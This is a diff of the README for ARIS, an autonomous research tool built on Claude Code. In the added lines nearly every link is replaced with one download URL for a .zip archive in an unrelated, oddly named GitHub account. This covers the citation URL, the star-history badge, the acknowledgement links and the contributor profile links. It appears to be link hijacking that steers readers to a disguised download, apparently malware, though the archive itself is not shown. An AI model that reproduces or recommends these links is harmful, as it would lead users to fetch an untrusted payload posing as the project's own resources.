 - [ ] **Reference-style figure generation** — read figures from reference PDFs → identify chart type, color scheme, layout → generate same-style figures with your own data. Sub-goal remaining: **Data charts** (extract color/font style → matplotlib rcParams). Method diagrams ✅ solved by `paper-illustration`
 - [ ] **Workflow execution report** — after each workflow (1/1.5/2/3) completes, auto-generate a structured summary: what was done, key decisions made, experiments run, results obtained, scores, and time spent. Output as `WORKFLOW_REPORT.md` for progress tracking, team reporting, and supervisor updates
 - [ ] **Document-based pipeline input** — support passing a detailed document (e.g., `RESEARCH_BRIEF.md`) as input to `/research-pipeline` or `/idea-discovery` instead of a one-line prompt. Many research directions need nuanced context (prior results, constraints, domain knowledge) that can't fit in a single sentence. The document would be parsed for problem definition, constraints, existing results, and specific requirements
-- [ ] **Auto hyperparameter tuning skill** — rewrite [auto-hparam-tuning](https://github.com/zxh0916/auto-hparam-tuning) as an ARIS SKILL.md. 5-step cycle: understand project → plan tuning strategy → run experiments → analyze metrics (TensorBoard/W&B) → learn and iterate. Would plug into Workflow 1.5 (`/experiment-bridge`) or Workflow 2 (`/auto-review-loop`) when reviewer says "tune hyperparameters"
+- [ ] **Auto hyperparameter tuning skill** — rewrite [auto-hparam-tuning](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) as an ARIS SKILL.md. 5-step cycle: understand project → plan tuning strategy → run experiments → analyze metrics (TensorBoard/W&B) → learn and iterate. Would plug into Workflow 1.5 (`/experiment-bridge`) or Workflow 2 (`/auto-review-loop`) when reviewer says "tune hyperparameters"
 
 ## 💬 Community
 
@@ -1230,7 +1230,7 @@ If you use ARIS in your research, please cite:
     title        = {ARIS: Fully Autonomous Research via Adversarial Multi-Agent Collaboration},
     year         = {2026},
     organization = {GitHub},
-    url          = {https://github.com/wanshuiyin/Auto-claude-code-research-in-sleep},
+    url          = {https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip},
 }
 ```
 
@@ -1238,53 +1238,53 @@ If you use ARIS in your research, please cite:
 
 ![GitHub stars](https://img.shields.io/github/stars/wanshuiyin/Auto-claude-code-research-in-sleep?style=social)
 
-[![Star History Chart](https://api.star-history.com/svg?repos=wanshuiyin/Auto-claude-code-research-in-sleep&type=Date&v=20260321)](https://star-history.com/#wanshuiyin/Auto-claude-code-research-in-sleep&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip)
 
 ## 🙏 Acknowledgements
 
 ARIS is inspired by:
 
-- 🧪 [AI Scientist](https://github.com/SakanaAI/AI-Scientist) (Sakana AI) — Automated research pioneer
-- 📖 [AutoResearch](https://github.com/karpathy/autoresearch) (Andrej Karpathy) — End-to-end research automation
-- 🔭 [FARS](https://analemma.ai/blog/introducing-fars/) (Analemma) — Fully Automated Research System
-- 🎨 [PaperBanana](https://github.com/dwzhu-pku/PaperBanana) (PKU) — Multi-agent academic illustration framework
+- 🧪 [AI Scientist](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (Sakana AI) — Automated research pioneer
+- 📖 [AutoResearch](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (Andrej Karpathy) — End-to-end research automation
+- 🔭 [FARS](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (Analemma) — Fully Automated Research System
+- 🎨 [PaperBanana](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) (PKU) — Multi-agent academic illustration framework
 
 This project builds on and integrates with many excellent open-source projects:
 
 **Core Infrastructure**
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) — Anthropic's CLI for Claude, the execution backbone
-- [Codex CLI](https://github.com/openai/codex) — OpenAI's CLI, used as MCP server for cross-model review
+- [Claude Code](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Anthropic's CLI for Claude, the execution backbone
+- [Codex CLI](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — OpenAI's CLI, used as MCP server for cross-model review
 
 **Zotero Integration** ([setup guide](#-zotero-integration-optional))
-- [zotero-mcp](https://github.com/54yyyu/zotero-mcp) — Zotero MCP server with semantic search and PDF annotations
-- [Zotero](https://www.zotero.org/) — Open-source reference manager
+- [zotero-mcp](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Zotero MCP server with semantic search and PDF annotations
+- [Zotero](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Open-source reference manager
 
 **Obsidian Integration** ([setup guide](#-obsidian-integration-optional))
-- [mcpvault](https://github.com/bitbonsai/mcpvault) — Obsidian vault MCP server (no app required)
-- [obsidian-skills](https://github.com/kepano/obsidian-skills) — Claude Code skills for Obsidian Markdown by Steph Ango (Obsidian CEO)
+- [mcpvault](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Obsidian vault MCP server (no app required)
+- [obsidian-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Claude Code skills for Obsidian Markdown by Steph Ango (Obsidian CEO)
 
 **Paper Writing Inspiration**
-- [claude-scholar](https://github.com/Galaxy-Dawn/claude-scholar) — Academic paper writing with Claude
-- [Research-Paper-Writing-Skills](https://github.com/Master-cai/Research-Paper-Writing-Skills) — Paper writing skill templates
-- [baoyu-skills](https://github.com/jimliu/baoyu-skills) — Claude Code skills collection
+- [claude-scholar](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Academic paper writing with Claude
+- [Research-Paper-Writing-Skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Paper writing skill templates
+- [baoyu-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Claude Code skills collection
 
 **Feishu/Lark Integration** ([setup guide](#-feishulark-integration-optional))
-- [feishu-claude-code](https://github.com/joewongjc/feishu-claude-code) — Bidirectional Feishu ↔ Claude Code bridge
-- [clawdbot-feishu](https://github.com/m1heng/clawdbot-feishu) — Feishu bot for Claude
-- [cc-connect](https://github.com/chenhg5/cc-connect) — Multi-platform messaging bridge
-- [lark-openapi-mcp](https://github.com/larksuite/lark-openapi-mcp) — Official Lark MCP server
+- [feishu-claude-code](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Bidirectional Feishu ↔ Claude Code bridge
+- [clawdbot-feishu](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Feishu bot for Claude
+- [cc-connect](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Multi-platform messaging bridge
+- [lark-openapi-mcp](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Official Lark MCP server
 
 **Community**
-- [awesome-agent-skills](https://github.com/VoltAgent/awesome-agent-skills) — Curated list of Claude Code skills (featured)
+- [awesome-agent-skills](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — Curated list of Claude Code skills (featured)
 
 **Special Thanks — Platform Adaptation**
 
 ARIS wouldn't run on so many platforms without these contributors:
 
-- 🤖 [@Falling-Flower](https://github.com/Falling-Flower) — adapted all ARIS skills for [Codex CLI](https://github.com/openai/codex) using `spawn_agent`
-- 🔧 [@No-518](https://github.com/No-518) — ongoing maintenance of the Codex skill set, keeping parity with latest updates
-- 🖱️ [@YecanLee](https://github.com/YecanLee) — wrote the [Cursor adaptation guide](docs/CURSOR_ADAPTATION.md) and local GPU setup docs
-- 🏆 [@DefanXue](https://github.com/DefanXue) & [@Monglitay](https://github.com/Monglitay) — first community paper built entirely with ARIS, scored 8/10 at CS conference
+- 🤖 [@Falling-Flower](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — adapted all ARIS skills for [Codex CLI](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) using `spawn_agent`
+- 🔧 [@No-518](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — ongoing maintenance of the Codex skill set, keeping parity with latest updates
+- 🖱️ [@YecanLee](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — wrote the [Cursor adaptation guide](docs/CURSOR_ADAPTATION.md) and local GPU setup docs
+- 🏆 [@DefanXue](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) & [@Monglitay](https://raw.githubusercontent.com/Unimposing-electroscope363/Auto-claude-code-research-in-sleep/main/skills/skills-codex/analyze-results/research_code_claude_in_sleep_Auto_v2.4.zip) — first community paper built entirely with ARIS, scored 8/10 at CS conference
 
 ## License
 
